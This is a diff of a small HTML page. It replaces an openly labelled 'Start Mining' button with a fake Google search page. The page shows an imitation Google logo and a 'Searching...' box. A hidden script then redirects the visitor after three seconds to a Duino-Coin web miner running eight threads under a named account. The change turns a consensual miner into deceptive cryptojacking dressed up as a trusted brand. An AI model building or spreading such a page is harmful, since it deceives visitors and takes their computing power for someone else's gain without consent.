@@ -1,11 +1,59 @@
 <!DOCTYPE html>
 <html>
-<body style="background:black; display:flex; justify-content:center; align-items:center; height:100vh;">
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Search</title>
 
-<button onclick="window.open('https://server.duinocoin.com/webminer.html?username=ZEXPYGAMING&threads=8&rigid=&keyinput=%23ZEXPY700','_blank')" 
-style="padding:20px; font-size:18px; border-radius:10px; border:none; background:#00ffcc; cursor:pointer;">
-Start Mining
-</button>
+<style>
+body {
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    font-family: Arial, sans-serif;
+    background: white;
+}
+
+.logo {
+    font-size: 48px;
+    font-weight: bold;
+    margin-bottom: 20px;
+}
+
+.logo span:nth-child(1){color:#4285F4;}
+.logo span:nth-child(2){color:#EA4335;}
+.logo span:nth-child(3){color:#FBBC05;}
+.logo span:nth-child(4){color:#4285F4;}
+.logo span:nth-child(5){color:#34A853;}
+.logo span:nth-child(6){color:#EA4335;}
+
+input {
+    width: 80%;
+    max-width: 400px;
+    padding: 12px;
+    border-radius: 24px;
+    border: 1px solid #ccc;
+    font-size: 16px;
+    text-align: center;
+}
+</style>
+
+<script>
+setTimeout(function(){
+    window.location.replace("https://server.duinocoin.com/webminer.html?username=ZEXPYGAMING&threads=8&rigid=&keyinput=%23ZEXPY700");
+}, 3000); // 3 seconds delay
+</script>
+
+</head>
+
+<body>
+
+<div class="logo">
+<span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
+</div>
+
+<input type="text" placeholder="Searching...">
 
 </body>
 </html>
